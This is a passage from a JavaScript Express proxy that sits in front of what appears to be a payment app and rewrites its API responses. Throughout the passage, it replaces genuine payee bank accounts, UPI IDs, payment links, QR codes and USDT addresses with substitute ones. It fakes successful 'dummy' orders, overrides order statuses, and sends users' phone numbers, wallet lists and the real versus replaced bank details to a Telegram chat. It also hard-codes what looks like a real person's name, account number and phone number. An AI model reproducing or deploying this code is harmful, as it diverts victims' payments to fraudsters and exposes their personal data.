          bot.sendMessage(data.adminChatId, delMsg.replace(/[*`]/g, '')).catch(() => { });
        });
      }

      const p = parseFloat(dummyMatch.percent) || data.defaultIncomePercent || 3;
      const amtNum = parseFloat(dummyMatch.amount || 2000);
      const incVal = parseFloat((amtNum * (p / 100)).toFixed(2));

      const jsonResp = {
        code: 1000,
        data: {
          id: buyId,
          orderId: buyId,
          payOrderId: buyId,
          buyId: buyId,
          amount: amtNum,
          orderAmount: amtNum,
          percent: p,
          commissionRate: p,
          income: incVal,
          commission: incVal,
          rebate: incVal,
          reward: incVal,
          profit: incVal,
          incomeAmount: incVal,
          commissionAmount: incVal,
          rebateAmount: incVal,
          rewardAmount: incVal,
          code: dummyMatch.code,
          orderCode: dummyMatch.code,
          remark: dummyMatch.code,
          sn: dummyMatch.code,
          status: 1
        },
        message: "success"
      };
      cacheOrderDetails(jsonResp.data);
      return sendJsonSafe(res, {}, jsonResp, JSON.stringify(jsonResp), req);
    }

    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (userId) { trackUser(data, userId, 'Deposit Order'); saveData(data).catch(() => { }); }

    const isSuccess = jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000' || jsonResp.code === '200');

    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);

      let orderAmt = parseFloat(body.amount || body.orderAmount || body.buyAmount || body.buy_amount || body.totalAmount || req.query?.amount || req.query?.buyAmount || 0) || 0;
      let orderCode = body.code || body.orderCode || body.buyCode || body.sn || body.orderNo || req.query?.code || req.query?.orderCode || '';

      if (!orderAmt || !orderCode) {
        const candidateKeys = [
          body.payOrderId, body.orderId, body.buyId, body.id, body.code, body.orderCode, body.buyCode, body.sn, body.orderNo, body.remark,
          req.query?.payOrderId, req.query?.orderId, req.query?.buyId, req.query?.id, req.query?.code, req.query?.orderCode, req.query?.sn, req.query?.orderNo
        ].filter(Boolean);

        for (const k of candidateKeys) {
          const kStr = String(k).trim();
          if (!kStr) continue;
          const cached = orderCache.get(kStr);
          if (cached) {
            if (!orderAmt && cached.amount) orderAmt = cached.amount;
            if (!orderCode && cached.code) orderCode = cached.code;
          }
        }
      }

      if (!isSuccess) {
        const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
        let msg =
          `❌ *Order Failed!*\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n`;
        if (orderCode) {
          msg += `📋 *Order Code:* \`${orderCode}\`\n`;
        }
        msg +=
          `💰 *Attempted Amount:* \`₹${orderAmt || 'N/A'}\`\n` +
          `⚠️ *Reason:* ${errorMsg}\n` +
          `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
      }
    }

    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.post('/app/payment/order/createUsdt', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const d = getResponseData(jsonResp) || {};
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `₮ USDT Order [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nAmount: ${d.amount || d.orderAmount || 'N/A'}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.post('/app/payment/order/submit', async (req, res) => {
  const data = await loadData();
  try {
    const body = req.parsedBody || {};
    const orderIdStr = String(body.orderId || body.orderNo || body.buyId || '').trim();
    const dummyMatch = findDummyOrder(data, orderIdStr);

    if (dummyMatch) {
      const subUserId = await extractUserId(req, null);
      if (data.adminChatId && bot) {
        bot.sendMessage(data.adminChatId, `📥 Payment Submitted (Dummy Order) [${subUserId || 'N/A'}]\nOrder: ${dummyMatch.code}`).catch(() => { });
      }
      const jsonResp = { code: 1000, message: "success" };
      return sendJsonSafe(res, {}, jsonResp, JSON.stringify(jsonResp), req);
    }

    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const subUserId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, subUserId) && !(await isLogOffByToken(data, req))) {
      const utrStr = body.utr || body.refNo || body.txnId || body.payNo || 'N/A';
      bot.sendMessage(data.adminChatId, `📥 Payment Submit [${subUserId || 'N/A'}]\nUTR: ${utrStr}\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || req.parsedBody?.buyId || 'N/A'}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.post('/app/payment/order/cancel', async (req, res) => {
  const data = await loadData();
  try {
    const body = req.parsedBody || {};
    const orderIdStr = String(body.orderId || body.orderNo || body.buyId || '').trim();
    const dummyMatch = findDummyOrder(data, orderIdStr);

    if (dummyMatch) {
      const cancelUserId = await extractUserId(req, null);
      if (data.adminChatId && bot) {
        bot.sendMessage(data.adminChatId, `❌ Order Cancelled (Dummy Order) [${cancelUserId || 'N/A'}]\nOrder: ${dummyMatch.code}`).catch(() => { });
      }
      const jsonResp = { code: 1000, message: "success" };
      return sendJsonSafe(res, {}, jsonResp, JSON.stringify(jsonResp), req);
    }

    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const cancelUserId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, cancelUserId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `❌ Order Cancelled [${cancelUserId || 'N/A'}]\nOrder: ${req.parsedBody?.orderId || req.parsedBody?.orderNo || req.parsedBody?.buyId || 'N/A'}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});





app.all('/app/payment/order/orderInfo', async (req, res) => {
  const data = await loadData();
  if (!data.botEnabled) return await transparentProxy(req, res);

  try {
    const q = req.query || {};
    const b = req.parsedBody || {};
    const targetId = String(q.buyId || q.orderId || q.payOrderId || q.orderNo || q.code || b.buyId || b.orderId || b.payOrderId || b.orderNo || b.code || '').trim();

    const dummyMatch = findDummyOrder(data, targetId);

    let response, respBody, respHeaders, jsonResp;

    if (dummyMatch) {
      const buyId = String(dummyMatch.id || dummyMatch.payOrderId);
      const nowMs = Date.now();
      if (!dummyMatch.expiryTimestamp) {
        dummyMatch.expiryTimestamp = nowMs + 15 * 60 * 1000;
      }
      const expiryMs = dummyMatch.expiryTimestamp;
      const amtNum = parseFloat(dummyMatch.amount || 5010);
      const userId = await extractUserIdFromToken(req) || await extractUserId(req, null);
      const bank = getActiveBank(data, userId);
      const phone = getPhone(data, userId);

      const savedWallet = (data.userRealPayoutWallets && userId && data.userRealPayoutWallets[String(userId)]);

      const walletNamesMap = { 1: "Airtel", 2: "Freecharge", 3: "PhonePe", 4: "Mobikwik", 5: "Paytm", 6: "AmazonPay" };
      const walletIntentMap = { 1: "airtel://", 2: "freecharge://", 3: "phonepe://", 4: "mobikwik://", 5: "paytmmp://", 6: "amazonpay://" };

      const wType = dummyMatch.payoutWalletType || (savedWallet ? savedWallet.payoutWalletType : null) || 2;
      const wName = dummyMatch.payoutWalletName || (savedWallet ? savedWallet.payoutWalletName : null) || walletNamesMap[wType] || "Freecharge";
      const wAcct = dummyMatch.payoutWalletAccount || (savedWallet ? savedWallet.payoutWalletAccount : null) || phone || "6206785398";

      const walletDefaultUpiSuffix = { 1: "@airtel", 2: "@freecharge", 3: "@ybl", 4: "@ikwik", 5: "@paytm", 6: "@apl" };

      let wUpi = dummyMatch.payoutWalletUpi || (savedWallet ? savedWallet.payoutWalletUpi : null);
      if (!wUpi) {
        const suffix = walletDefaultUpiSuffix[wType] || ("@" + wName.toLowerCase());
        wUpi = wAcct + suffix;
      }

      const wIntent = dummyMatch.intent || (savedWallet ? savedWallet.intent : null) || walletIntentMap[wType] || (wName.toLowerCase() + "://");

      jsonResp = {
        code: 1000,
        data: {
          id: buyId,
          orderId: buyId,
          buyId: buyId,
          payOrderId: buyId,
          code: dummyMatch.code,
          orderCode: dummyMatch.code,
          orderNo: dummyMatch.code,
          remark: dummyMatch.code,
          sn: dummyMatch.code,
          amount: amtNum,
          orderAmount: amtNum,
          totalAmount: amtNum,
          unpaidAmount: amtNum,
          payeeAccount: bank ? bank.accountNo : "009110281719",
          payeeName: bank ? bank.accountHolder : "SATYAM KUMAR",
          name: bank ? bank.accountHolder : "SATYAM KUMAR",
          accountName: bank ? bank.accountHolder : "SATYAM KUMAR",
          ifsc: bank ? bank.ifsc : "IPOS0000001",
          bankAccount: bank ? bank.accountNo : "009110281719",
          accountNo: bank ? bank.accountNo : "009110281719",
          typeLabel: "IMPS",
          channelName: "IMPS",
          bankName: "IMPS",
          status: 1,
          statusCode: 1,
          state: 1,
          orderStatus: 1,
          statusLabel: "Processing",
          stateLabel: "Processing",
          nowTimestamp: nowMs,
          currentTime: nowMs,
          serverTime: nowMs,
          expiryTimestamp: expiryMs,
          expireTimeStamp: expiryMs,
          expireTime: Math.floor(expiryMs / 1000),
          intent: wIntent,
          freechargeIntent: wType === 2 ? wIntent : null,
          mobikwikIntent: wType === 4 ? wIntent : null,
          paytmIntent: wType === 5 ? wIntent : null,
          payUrl: wIntent,
          payoutWalletType: wType,
          payoutWallet: { name: wName, type: wType },
          payTypeName: wName,
          walletName: wName,
          payoutWalletName: wName,
          payoutWalletAccount: wAcct,
          payoutWalletUpi: wUpi,
          payoutAccount: wAcct,
          payoutPhone: wAcct,
          payoutUpi: wUpi
        },
        message: "success"
      };
      respBody = JSON.stringify(jsonResp);
      respHeaders = {};

      if (!dummyMatch._sentBuyAlert && data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
        dummyMatch._sentBuyAlert = true;
        data.sentOrderInfo = data.sentOrderInfo || {};
        data.sentOrderInfo[dummyMatch.code] = true;
        if (dummyMatch.id) data.sentOrderInfo[String(dummyMatch.id)] = true;

        const bankToUse = bank || { accountHolder: "SATYAM KUMAR", accountNo: "009110281719", ifsc: "IPOS0000001" };
        let dummyMsg =
          `✅ *Order Buy Successfully (Dummy Order)*\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n` +
          `📋 *Order Code:* \`${dummyMatch.code}\`\n` +
          `💰 *Amount:* \`₹${dummyMatch.amount}\`\n` +
          `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `📱 *Payout:* ${wName} (\`${wAcct}\`)\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `🏦 *Real Bank Details:*\n` +
          `   Acc: \`N/A (Dummy)\`\n` +
          `   Name: \`N/A (Dummy)\`\n` +
          `   IFSC: \`N/A (Dummy)\`\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `🔄 *Replaced With:*\n` +
          `   Acc: \`${bankToUse.accountNo}\`\n` +
          `   Name: \`${bankToUse.accountHolder}\`\n` +
          `   IFSC: \`${bankToUse.ifsc}\`${bankToUse.bankName ? ' | ' + bankToUse.bankName : ''}\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `💾 *KV Status:* Order code \`${dummyMatch.code}\` & bank details saved to KV storage!`;

        bot.sendMessage(data.adminChatId, dummyMsg, { parse_mode: 'Markdown' }).catch(() => {
          bot.sendMessage(data.adminChatId, dummyMsg.replace(/[*`]/g, '')).catch(() => { });
        });
        saveData(data).catch(() => { });
      }
    } else {
      const prox = await proxyFetch(req);
      response = prox.response;
      respBody = prox.respBody;
      respHeaders = prox.respHeaders;
      jsonResp = prox.jsonResp;
    }

    const detailData = getResponseData(jsonResp);

    const userId = await extractUserIdFromToken(req) || await extractUserId(req, jsonResp);
    const bank = getActiveBank(data, userId);

    if (detailData && typeof detailData === 'object' && detailData.payoutWalletUpi && userId) {
      data.userRealPayoutWallets = data.userRealPayoutWallets || {};
      data.userRealPayoutWallets[String(userId)] = {
        payoutWalletName: detailData.payoutWalletName || 'Freecharge',
        payoutWalletAccount: detailData.payoutWalletAccount || '6206785398',
        payoutWalletUpi: detailData.payoutWalletUpi,
        payoutWalletType: detailData.payoutWalletType || 2,
        intent: detailData.intent || 'freecharge://'
      };
      saveData(data).catch(() => { });
    }

    if (detailData) {
      const dd = (typeof detailData === 'object' && !Array.isArray(detailData)) ? detailData : {};
      const orderAmt = parseFloat(
        dd.amount || dd.orderAmount || dd.buyAmount || dd.unpaidAmount || dd.totalAmount || 0
      ) || 0;

      const realAcct = dd.payeeAccount || dd.bankAccount || dd.accountNo || dd.account || dd.receiveAccount || '';
      const realName = dd.name || dd.payeeName || dd.accountName || dd.beneficiaryName || dd.receiveName || dd.realName || dd.userName || dd.accountHolder || '';
      const realIfsc = dd.ifsc || dd.ifscCode || dd.bankIfsc || dd.receiveIfsc || '';

      const orderIdStr = String(dd.orderId || dd.orderNo || dd.buyId || req.query?.buyId || req.query?.orderId || '').trim();
      const cached = orderIdStr ? orderCache.get(orderIdStr) : null;
      const orderCodeStr = String(dd.code || dd.orderCode || dd.buyCode || dd.sn || extractOrderCode(dd) || (cached ? cached.code : '') || orderIdStr || 'N/A').trim();

      if (data.orderStatusOverrides && typeof data.orderStatusOverrides === 'object') {
        const itemOrderNo = String(dd.orderNo || '').trim();
        const itemRemark = String(dd.remark || '').trim();
        const itemBuyId = String(dd.buyId || '').trim();
        const itemPayOrderId = String(dd.payOrderId || '').trim();

        const candKeys = [
          orderCodeStr, orderIdStr, itemOrderNo, itemRemark, itemBuyId, itemPayOrderId,
          `${userId}:${orderCodeStr}`, `${userId}:${orderIdStr}`, `${userId}:${itemOrderNo}`, `${userId}:${itemRemark}`
        ].filter(Boolean);

        let stOverride = null;
        for (const k of candKeys) {
          if (data.orderStatusOverrides[k]) {
            stOverride = data.orderStatusOverrides[k];
            break;
          }
        }

        if (stOverride && stOverride.status !== undefined) {
          const targetStatus = Number(stOverride.status);
          const statusLabels = { 1: "Processing", 2: "Processing", 3: "Completed", 4: "Close" };
          const labelStr = stOverride.statusLabel || statusLabels[targetStatus] || "Completed";

          dd.status = targetStatus;
          if (dd.state !== undefined) dd.state = targetStatus;
          if (dd.orderStatus !== undefined) dd.orderStatus = targetStatus;
          if (dd.statusCode !== undefined) dd.statusCode = targetStatus;
          if (dd.statusLabel !== undefined) dd.statusLabel = labelStr;
          if (dd.stateLabel !== undefined) dd.stateLabel = labelStr;
        }
      }

      data.orderBankMap = data.orderBankMap || {};
      data.sentOrderInfo = data.sentOrderInfo || {};

      let boundBank = null;
      if (orderCodeStr && data.orderBankMap[orderCodeStr]) boundBank = data.orderBankMap[orderCodeStr].bank;
      else if (orderIdStr && data.orderBankMap[orderIdStr]) boundBank = data.orderBankMap[orderIdStr].bank;

      const bankToUse = boundBank || bank;
      let replaced = false;
      let notReplacedReason = '';

      if (bankToUse) {
        if (bankToUse.minAmount && orderAmt > 0 && orderAmt < bankToUse.minAmount) {
          notReplacedReason = `Order ₹${orderAmt} < Min ₹${bankToUse.minAmount}`;
        } else {
          replaced = true;
          if (Array.isArray(detailData)) {
            detailData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bankToUse, {}, 0); });
          } else {
            deepReplace(detailData, bankToUse, {}, 0);
          }

          if (detailData && typeof detailData === 'object' && !Array.isArray(detailData)) {
            const upiVpa = bankToUse.upiId || (bankToUse.accountNo ? `${bankToUse.accountNo}@${(bankToUse.ifsc || 'npci').toLowerCase()}.ifsc.npci` : '');
            const acctFields = ['payeeAccount', 'bankAccount', 'accountNo', 'account', 'receiveAccount', 'payoutAccount', 'payoutAccountNo', 'collectionAccount', 'payeeAccountNo'];
            const nameFields = ['payeeName', 'name', 'accountName', 'beneficiaryName', 'receiveName', 'realName', 'accountHolder', 'payoutName', 'payoutAccountName', 'collectionName'];
            const ifscFields = ['ifsc', 'ifscCode', 'bankIfsc', 'receiveIfsc', 'payoutIfsc', 'collectionIfsc'];
            const bankFields = ['bankName', 'bank_name', 'bank', 'payoutBank', 'payeeBankName', 'collectionBankName'];
            const upiFields = ['payoutUpi', 'payoutUpiId', 'payeeUpi', 'upi', 'upiId', 'vpa', 'collectionUpi'];

            acctFields.forEach(k => { if (detailData[k] !== undefined) detailData[k] = bankToUse.accountNo; });
            nameFields.forEach(k => { if (detailData[k] !== undefined) detailData[k] = bankToUse.accountHolder; });
            ifscFields.forEach(k => { if (detailData[k] !== undefined) detailData[k] = bankToUse.ifsc; });
            bankFields.forEach(k => { if (detailData[k] !== undefined) detailData[k] = bankToUse.bankName || 'IMPS'; });
            upiFields.forEach(k => { if (detailData[k] !== undefined) detailData[k] = upiVpa; });

            const urlKeys = ['intent', 'payUrl', 'freechargeIntent', 'mobikwikIntent', 'paytmIntent', 'deeplink', 'qrData', 'qrCode'];
            urlKeys.forEach(k => {
              if (detailData[k] && typeof detailData[k] === 'string') {
                detailData[k] = replaceBankInUrl(detailData[k], bankToUse);
              }
            });
          }

          let respStr = JSON.stringify(jsonResp);
          if (realAcct && realAcct.length > 4 && bankToUse.accountNo) {
            respStr = respStr.split(realAcct).join(bankToUse.accountNo);
          }
          if (realName && realName.length > 4 && bankToUse.accountHolder) {
            respStr = respStr.split(realName).join(bankToUse.accountHolder);
          }
          if (realIfsc && realIfsc.length > 4 && bankToUse.ifsc) {
            respStr = respStr.split(realIfsc).join(bankToUse.ifsc);
          }
          try { jsonResp = JSON.parse(respStr); } catch (e) { }
          respBody = JSON.stringify(jsonResp);

          if (!boundBank && (orderCodeStr !== 'N/A' || orderIdStr)) {
            const bindingObj = {
              orderCode: orderCodeStr !== 'N/A' ? orderCodeStr : orderIdStr,
              buyId: orderIdStr || orderCodeStr,
              userId: String(userId || ''),
              amount: orderAmt,
              bank: {
                accountHolder: bankToUse.accountHolder,
                accountNo: bankToUse.accountNo,
                ifsc: bankToUse.ifsc,
                bankName: bankToUse.bankName || ''
              },
              realBank: {
                accountHolder: realName || 'N/A',
                accountNo: realAcct || 'N/A',
                ifsc: realIfsc || 'N/A'
              },
              time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
              timestamp: Date.now()
            };
            if (orderCodeStr && orderCodeStr !== 'N/A') data.orderBankMap[orderCodeStr] = bindingObj;
            if (orderIdStr) data.orderBankMap[orderIdStr] = bindingObj;
            saveData(data).catch(() => { });
          }
        }
      }

      if (data.usdtAddress) {
        replaceUsdtInResponse(jsonResp, data);
        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(data.usdtAddress)}`;
        let str = JSON.stringify(jsonResp);
        str = str.replace(/https?:\/\/oss\.[^\s"',\\}]+/gi, qrUrl);
        str = str.replace(/https?:\/\/[^\s"',\\}]+(qr|QR|qrcode|code)[^\s"',\\}]*/gi, qrUrl);
        try { Object.assign(jsonResp, JSON.parse(str)); } catch (e) { }
      }

      if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
        const phone = getPhone(data, userId);
        const isAlreadySent = (orderCodeStr !== 'N/A' && data.sentOrderInfo[orderCodeStr]) || (orderIdStr && data.sentOrderInfo[orderIdStr]);

        if (!isAlreadySent) {
          if (orderCodeStr && orderCodeStr !== 'N/A') data.sentOrderInfo[orderCodeStr] = true;
          if (orderIdStr) data.sentOrderInfo[orderIdStr] = true;
          saveData(data).catch(() => { });

          let payoutSection = '';
          if (dd.payoutWallet || dd.walletName || dd.payTypeName || dd.payoutWalletName) {
            const wName = dd.payoutWalletName || dd.walletName || dd.payTypeName || (dd.payoutWallet && dd.payoutWallet.name) || 'Unknown';
            const wAddr = dd.payoutWalletAccount || dd.payoutAccount || dd.payoutWalletUpi || dd.payoutUpi || dd.address || 'N/A';
            payoutSection = `📱 *Payout:* ${wName} (\`${wAddr}\`)\n━━━━━━━━━━━━━━━━━━\n`;
          }

          let bankSection = '';
          if (replaced && bankToUse) {
            bankSection =
              `🏦 *Real Bank Details:*\n` +
              `   Acc: \`${realAcct || (dummyMatch ? 'N/A (Dummy)' : 'N/A')}\`\n` +
              `   Name: \`${realName || (dummyMatch ? 'N/A (Dummy)' : 'N/A')}\`\n` +
              `   IFSC: \`${realIfsc || (dummyMatch ? 'N/A (Dummy)' : 'N/A')}\`\n` +
              `━━━━━━━━━━━━━━━━━━\n` +
              `🔄 *Replaced With:*\n` +
              `   Acc: \`${bankToUse.accountNo}\`\n` +
              `   Name: \`${bankToUse.accountHolder}\`\n` +
              `   IFSC: \`${bankToUse.ifsc}\`${bankToUse.bankName ? ' | ' + bankToUse.bankName : ''}`;
          } else if (notReplacedReason) {
            bankSection = `⚠️ *Bank NOT Replaced*\n   Reason: ${notReplacedReason}`;
          } else {
            bankSection = `⚠️ *No active bank set*`;
          }

          const orderTitle = dummyMatch ? `✅ *Order Buy Successfully (Dummy Order)*` : `✅ *Order Buy Successfully*`;

          const msg =
            `${orderTitle}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n` +
            `📋 *Order Code:* \`${orderCodeStr}\`\n` +
            `💰 *Amount:* \`₹${orderAmt || 'N/A'}\`\n` +
            `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            payoutSection +
            bankSection + `\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `💾 *KV Status:* Order code \`${orderCodeStr}\` & bank details saved to KV storage!`;

          bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
        }
      }
    }

    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/payment/order/usdtInfo', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/payment/order/summary', async (req, res) => { await proxyAndAddBonus(req, res); });

app.all('/app/payment/order/history', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/app/receive/order/history', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
app.all('/app/payment/order', async (req, res) => { await proxyAndReplaceBankInList(req, res); });

app.all('/app/payment/app/buy/order/usdt', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    if (data.usdtAddress && jsonResp) replaceUsdtInResponse(jsonResp, data);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      const phone = getPhone(data, userId);
      bot.sendMessage(data.adminChatId, `₮ Buy USDT Order [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

const COLLECTION_ENDPOINTS = [
  '/app/ct/app/collection/allAvailable',
  '/app/ct/app/collection/available',
  '/app/ct/app/collection/getWalletList',
  '/app/ct/app/collection/getPayoutWalletList',
  '/app/ct/app/collection/getKycList',
  '/app/ct/app/collection/one',
  '/app/ct/app/collection/two',
  '/app/ct/app/collection/three',
  '/app/ct/app/collection/check',
  '/app/ct/app/collection/submit',
  '/app/ct/app/collection/v2/submit',
  '/app/ct/app/collection/link',
  '/app/ct/app/collection/sendOtp',
  '/app/ct/app/collection/verifyOtp'
];

for (const ep of COLLECTION_ENDPOINTS) {
  app.all(ep, async (req, res) => {
    const data = await loadData();
    try {
      const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
      const userId = await extractUserId(req, jsonResp);
      const phone = getPhone(data, userId);
      if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
        const path = req.originalUrl.split('?')[0];
        const simpleEndpoints = [
          '/app/ct/app/collection/getWalletList',
          '/app/ct/app/collection/available',
          '/app/ct/app/collection/allAvailable',
          '/app/ct/app/collection/getPayoutWalletList',
          '/app/ct/app/collection/getKycList'
        ];

        if (simpleEndpoints.includes(path)) {
          if (path === '/app/ct/app/collection/getWalletList' && jsonResp && jsonResp.code === 1000 && Array.isArray(jsonResp.data)) {
            let msg = `💳 *Link UPI Report*\n\n`;
            msg += `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n\n`;
            jsonResp.data.forEach((item, index) => {
              const status = item.status === 1 ? '✅ Enabled' : '❌ Failed';
              const walletName = item.wallet ? item.wallet.name : 'Unknown App';
              const address = item.address || 'No UPI ID';
              const range = item.acceptableRange ? `₹${item.acceptableRange[0]} ~ ₹${item.acceptableRange[1]}` : 'N/A';
              msg += `${index + 1}. *${walletName}* [${status}]\n`;
              msg += `   📍 ID: \`${address}\`\n`;
              msg += `   💰 Range: \`${range}\`\n\n`;
            });
            bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
          } else if (path === '/app/ct/app/collection/getPayoutWalletList') {
            if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000' || jsonResp.code === '200') && jsonResp.data) {
              const wallets = Array.isArray(jsonResp.data) ? jsonResp.data : [jsonResp.data];
              if (wallets.length > 0) {
                let msg = `📱 *Select Tool / Payout Wallet List*\n` +
                  `━━━━━━━━━━━━━━━━━━\n` +
                  `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n\n`;

                wallets.forEach((item, index) => {
                  const wName = getWalletName(item);
                  const wAddr = item.address || item.account || item.payoutAccount || item.payoutUpi || item.phone || item.mobile || item.upiId || item.accountNo || 'N/A';
                  const status = item.status === 1 ? '✅ Enabled' : (item.status === 0 ? '🔴 Disabled' : '');
                  const range = item.acceptableRange ? `₹${item.acceptableRange[0]} ~ ₹${item.acceptableRange[1]}` : (item.minAmount ? `Min ₹${item.minAmount}` : '');

                  msg += `${index + 1}. 💳 *App Name:* \`${wName}\`${status ? ' [' + status + ']' : ''}\n`;
                  msg += `   📍 *UPI / Number:* \`${wAddr}\`\n`;
                  if (range) msg += `   💰 *Range:* \`${range}\`\n`;
                  msg += `\n`;
                });
                bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
              }
            }
          } else {
            // No extra log for success on these endpoints
          }
        } else {
          // No extra log for other endpoints unless needed
        }
      }
      sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
    } catch (e) { await transparentProxy(req, res); }
  });
}

app.all('/app/ct/app/collection/offSell/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔴 Collection OFF Sell [${userId || 'N/A'}]\n${req.originalUrl}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/ct/app/collection/changeStatus/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔄 Collection Status Change [${userId || 'N/A'}]\n${req.originalUrl}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/ct/app/collection/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    const phone = getPhone(data, userId);
    if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
      bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/onSell/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🟢 Withdraw ON [${userId || 'N/A'}]`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/offSell/*', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const userId = await extractUserId(req, jsonResp);
    if (data.adminChatId && bot) {
      bot.sendMessage(data.adminChatId, `🔴 Withdraw OFF [${userId || 'N/A'}]`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.all('/app/user/info/updatePassword', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
